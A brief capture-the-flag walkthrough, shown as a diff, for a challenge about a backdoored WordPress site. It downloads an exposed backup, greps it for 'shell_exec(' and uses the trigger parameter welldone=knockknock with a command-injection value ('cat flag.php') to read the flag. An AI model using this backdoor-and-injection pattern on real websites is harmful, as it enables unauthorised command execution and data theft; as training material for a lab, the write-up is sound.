@@ -1,0 +1,12 @@
+"Our website has been breached multiple times. Now we even found a backup.zip in a public path and still can not find the backdoor."
+we see a basic wordpress page
+as mentioned in the description we try
+wget http://34.107.45.207:30148//backup.zip 
+we can unzip it and check vulnerability
+https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720
+inside the backup folder we use
+grep -r "shell_exec("
+if we have welldone=knockknock, then shazam=<injection> 
+now we can check the page source of the website and successfully find the flag
+?welldone=knockknock&shazam=cat flag.php
+
